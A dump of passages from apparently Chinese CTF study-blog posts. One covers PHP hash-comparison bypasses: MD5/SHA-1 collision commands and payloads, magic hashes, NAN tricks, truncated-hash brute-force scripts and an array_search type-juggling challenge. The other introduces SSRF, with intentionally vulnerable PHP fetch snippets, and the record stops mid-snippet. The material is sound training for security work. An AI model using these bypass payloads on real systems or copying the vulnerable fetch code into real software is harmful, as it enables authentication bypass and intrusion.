+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5collgen -o <span class="number">1</span>.bin <span class="number">2</span>.bin</span><br></pre></td></tr></table></figure>
+
+<p>windows可以下载fastcoll，碰撞生成两个md5值相同但内容不同的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll.exe -p <span class="number">123</span>.txt -o <span class="number">1</span>.txt <span class="number">2</span>.txt</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="sha1碰撞："><a href="#sha1碰撞：" class="headerlink" title="sha1碰撞："></a>sha1碰撞：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>%<span class="number">7</span>FF%DC%<span class="number">93</span>%A6%B6%<span class="number">7</span>E%<span class="number">01</span>%<span class="number">3</span>B%<span class="number">02</span>%<span class="number">9</span>A%AA%<span class="number">1</span>D%B2V%<span class="number">0</span>BE%CAg%D6%<span class="number">88</span>%C7%F8K%<span class="number">8</span>CLy%<span class="number">1</span>F%E0%<span class="number">2</span>B%<span class="number">3</span>D%F6%<span class="number">14</span>%F8m%B1i%<span class="number">09</span>%<span class="number">01</span>%C5kE%C1S%<span class="number">0</span>A%FE%DF%B7%<span class="number">608</span>%E9rr/%E7%ADr%<span class="number">8</span>F%<span class="number">0</span>EI%<span class="number">04</span>%E0F%C20W%<span class="number">0</span>F%E9%D4%<span class="number">13</span>%<span class="number">98</span>%AB%E1.%F5%BC%<span class="number">94</span>%<span class="number">2</span>B%E35B%A4%<span class="number">80</span>-%<span class="number">98</span>%B5%D7%<span class="number">0</span>F%<span class="number">2</span>A3.%C3%<span class="number">7</span>F%AC5%<span class="number">14</span>%E7M%DC%<span class="number">0</span>F%<span class="number">2</span>C%C1%A8t%CD%<span class="number">0</span>Cx0Z%<span class="number">21</span>Vda0%<span class="number">97</span>%<span class="number">89</span>%<span class="number">60</span>k%D0%BF%<span class="number">3</span>F%<span class="number">98</span>%CD%A8%<span class="number">04</span>F%<span class="number">29</span>%A1</span><br><span class="line">b=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>sF%DC%<span class="number">91</span>f%B6%<span class="number">7</span>E%<span class="number">11</span>%<span class="number">8</span>F%<span class="number">02</span>%<span class="number">9</span>A%B6%<span class="number">21</span>%B2V%<span class="number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="number">5</span>B%A8Ly%<span class="number">03</span>%<span class="number">0</span>C%<span class="number">2</span>B%<span class="number">3</span>D%E2%<span class="number">18</span>%F8m%B3%A9%<span class="number">09</span>%<span class="number">01</span>%D5%DFE%C1O%<span class="number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="number">8</span>F%<span class="number">0</span>EE%BC%E0F%D2%<span class="number">3</span>CW%<span class="number">0</span>F%EB%<span class="number">14</span>%<span class="number">13</span>%<span class="number">98</span>%BBU.%F5%A0%A8%<span class="number">2</span>B%E31%FE%A4%<span class="number">807</span>%B8%B5%D7%<span class="number">1</span>F%<span class="number">0E3</span>.%DF%<span class="number">93</span>%AC5%<span class="number">00</span>%EBM%DC%<span class="number">0</span>D%EC%C1%A8dy%<span class="number">0</span>Cx%<span class="number">2</span>Cv%<span class="number">21</span>V%<span class="number">60</span>%DD0%<span class="number">97</span>%<span class="number">91</span>%D0k%D0%AF%<span class="number">3</span>F%<span class="number">98</span>%CD%A4%BCF%<span class="number">29</span>%B1</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="实验8"><a href="#实验8" class="headerlink" title="实验8"></a>实验8</h1><p><img src="/.com//image-20250417175035-pl0a3iz.png" alt="image"></p>
+<p><img src="/.com//image-20250417175038-xd91avl.png" alt="image"></p>
+<p>两个SHA1值相同而SHA256的值不同的pdf文件, <a target="_blank" rel="noopener" href="https://shattered.it/static/shattered-1.pdf">shattered-1.pdf</a>和<a target="_blank" rel="noopener" href="https://shattered.it/static/shattered-2.pdf">shattered-2.pdf</a></p>
+<p>‍</p>
+<h1 id="a-md5-a"><a href="#a-md5-a" class="headerlink" title="$a==md5($a)"></a>$a==md5($a)</h1><p>​<code>0e215962017</code>​的 <code>MD5</code>​ 值也是由 <code>0e</code>​ 开头，在 PHP 弱类型比较中等</p>
+<p>‍</p>
+<h1 id="实验9"><a href="#实验9" class="headerlink" title="实验9"></a>实验9</h1><p><img src="/.com//image-20250417175101-50g9dml.png" alt="image"></p>
+<p><img src="/.com//image-20250417175105-z4p4lmw.png" alt="image"></p>
+<p>‍</p>
+<h1 id="NAN-和-INF"><a href="#NAN-和-INF" class="headerlink" title="NAN 和 INF"></a>NAN 和 INF</h1><p>NAN和INF，分别为非数字和无穷大，但是通过<code>var_dump</code>​查看数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串<code>NAN</code>​和字符串<code>INF</code>​使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至<code>NAN=NAN</code>​都是false，但<code>md5(&#39;NaN&#39;)==md5(&#39;NAN&#39;)</code>​为true。</p>
+<p>‍</p>
+<h1 id="实验10"><a href="#实验10" class="headerlink" title="实验10"></a>实验10</h1><p><img src="/.com//image-20250417175117-ndyibgq.png" alt="image"></p>
+<p><img src="/.com//image-20250417175121-hgvnlqn.png" alt="image"></p>
+<p><img src="/.com//image-20250417175124-dql4g5j.png" alt="image"></p>
+<p><img src="/.com//image-20250417175127-ivcykbh.png" alt="image"></p>
+<p>可以使用<code>NAN</code>​绕过<code>md5()</code>​和<code>sha1()</code>​</p>
+<p>‍</p>
+<h1 id="截断比较"><a href="#截断比较" class="headerlink" title="截断比较"></a>截断比较</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>),<span class="number">0</span>,<span class="number">5</span>)===<span class="string">&#x27;8ffb1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="MD5截断爆破"><a href="#MD5截断爆破" class="headerlink" title="MD5截断爆破"></a>MD5截断爆破</h2><p>给出一段<code>md5</code>​值要求找到匹配的原码。一般使用爆破脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy import Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">md5</span>(ant):  <span class="comment"># 计算MD5字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">str</span>(ant).<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;8ffb1&#x27;</span>  <span class="comment"># 已知的md5截断值</span></span><br><span class="line">md5start = <span class="number">0</span>  <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">md5length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">findmd5</span>(sss):  <span class="comment"># 输入范围 里面会进行md5测试</span></span><br><span class="line">    key = sss.<span class="title function_ invoke__">split</span>(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="keyword">int</span>(key[<span class="number">0</span>])  <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="keyword">int</span>(key[<span class="number">1</span>])  <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">md5</span>(i)[<span class="number">0</span>:<span class="number">5</span>] == keymd5:  <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="keyword">print</span>(f<span class="string">&#x27;&#123;result&#125; &#123;md5(result)&#125;&#x27;</span>)  <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span> = []  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">10</span>):  <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="keyword">list</span>.<span class="title function_ invoke__">append</span>(<span class="title function_ invoke__">str</span>(<span class="number">10000000</span> * i) + <span class="string">&#x27;:&#x27;</span> + <span class="title function_ invoke__">str</span>(<span class="number">10000000</span> * (i + <span class="number">1</span>)))</span><br><span class="line"><span class="comment"># print(list)</span></span><br><span class="line">pool = <span class="title function_ invoke__">ThreadPool</span>()  <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="title function_ invoke__">map</span>(findmd5, <span class="keyword">list</span>)  <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.<span class="title function_ invoke__">close</span>()</span><br><span class="line">pool.<span class="title function_ invoke__">join</span>()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250417175151-7xw4wjg.png" alt="image"></p>
+<p>‍</p>
+<h2 id="sha256截断爆破"><a href="#sha256截断爆破" class="headerlink" title="sha256截断爆破"></a>sha256截断爆破</h2><p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sha256截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(sha256(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">s</span>):  <span class="comment"># 计算sha256字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(<span class="string">f&#x27;TQLCTF<span class="subst">&#123;s&#125;</span>&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keysha256 = <span class="string">&#x27;5625f&#x27;</span>  <span class="comment"># 已知的sha256截断值</span></span><br><span class="line">sha256start = <span class="number">0</span>  <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">sha256length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findsha256</span>(<span class="params">sss</span>):  <span class="comment"># 输入范围 里面会进行sha256测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])  <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])  <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(sha256(i)[sha256start:sha256length])</span></span><br><span class="line">        <span class="keyword">if</span> sha256(i)[<span class="number">0</span>:<span class="number">5</span>] == keysha256:  <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;result&#125;</span> <span class="subst">&#123;sha256(result)&#125;</span>&#x27;</span>)  <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = []  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span> * i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span> * (i + <span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()  <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="built_in">map</span>(findsha256, <span class="built_in">list</span>)  <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250417175213-75wbvwu.png" alt="image"></p>
+<p>‍</p>
+<h1 id="array-search和is-array"><a href="#array-search和is-array" class="headerlink" title="array_search和is_array"></a>array_search和is_array</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (!is_array($_GET[<span class="string">&#x27;test&#x27;</span>])) &#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$test = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($test); $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($test[$i] === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        echo <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    $test[$i] = intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (array_search(<span class="string">&quot;admin&quot;</span>, $test) === <span class="number">0</span>) &#123;</span><br><span class="line">    echo <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;failed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250417175225-hxln96p.png" alt="image"></p>
+<p><img src="/.com//image-20250417175228-20igd3y.png" alt="image"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" data-id="cmawcq0mk0006rk7k8izfdol3" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/SSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/SSRF/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、SSRF是什么？"><a href="#一、SSRF是什么？" class="headerlink" title="一、SSRF是什么？"></a>一、SSRF是什么？</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
+<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<hr>
+<h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</span></p>
+<p><img src="/.com//image-20250520025641-k2sfyci.png" alt="image"></p>
+<p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
+<hr>
+<h2 id="三、SSRF漏洞挖掘"><a href="#三、SSRF漏洞挖掘" class="headerlink" title="三、SSRF漏洞挖掘"></a>三、SSRF漏洞挖掘</h2><p>1、分享：通过URL地址分享网页内容</p>
+<p><img src="/.com//image-20250520025700-u9pjgmi.png" alt="image"></p>
+<p>2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p>
+<p>3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p>
+<p><img src="/.com//image-20250520025709-vdxc2ye.png" alt="image"></p>
+<p>4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p>
+</blockquote>
+<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
+<p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p>
+<p><img src="/.com//image-20250520025722-dq5eksz.png" alt="image"></p>
+<p>6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p>
+<p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p>
+<p>7、从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞</p>
+<blockquote>
+<p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p>
+</blockquote>
+<p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p>
+<hr>
+<h2 id="四、产生SSRF漏洞的函数"><a href="#四、产生SSRF漏洞的函数" class="headerlink" title="四、产生SSRF漏洞的函数"></a>四、产生SSRF漏洞的函数</h2><p>SSRF攻击可能存在任何语言编写的应用，接下来将举例&#x3D;&#x3D;php&#x3D;&#x3D;中可能存在SSRF漏洞的函数。</p>
+<p><strong>1、file_get_contents:</strong></p>
+<p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line">file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$img</span>; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、sockopen():</strong></p>
+<p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">function</span> GetFile(<span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span>) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$errstr</span> (error number <span class="variable">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose(<span class="variable">$fp</span>); </span><br><span class="line"><span class="built_in">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、curl_exec():</strong></p>
+<p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = <span 